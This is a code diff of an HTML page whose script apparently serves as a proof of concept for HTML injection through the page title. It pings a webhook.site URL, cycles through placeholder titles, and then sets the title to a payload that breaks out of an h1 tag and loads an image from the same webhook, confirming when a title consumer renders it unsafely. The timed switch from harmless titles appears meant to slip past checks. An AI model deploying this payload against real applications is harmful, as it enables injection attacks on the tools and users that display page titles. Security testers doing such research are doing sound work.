@@ -4,23 +4,19 @@
     <script>
         (new Image()).src = "https://webhook.site/24b8629b-f9e4-4e91-a42a-80e7822f458d?stage=1";
 
+        let count = 0;
+        const benignTitles = ["A", "B", "C", "D", "E", "F"];
         const payload = `</h1><img src="https://webhook.site/24b8629b-f9e4-4e91-a42a-80e7822f458d?stage=2"><h1>`;
 
-        setTimeout(() => {
-            document.title = "Init";
-        }, 300);
-
-        setTimeout(() => {
-            document.title = payload;
-        }, 1200);
-        
-         setTimeout(() => {
-            document.title = "Cg";
-        }, 2000);
-
-        setTimeout(() => {
-            document.title = payload;
-        }, 3000);
+        const interval = setInterval(() => {
+            if (count < benignTitles.length) {
+                document.title = benignTitles[count];
+            } else {
+                document.title = payload;
+                clearInterval(interval);
+            }
+            count++;
+        }, 1000);
     </script>
 </body>
 </html>
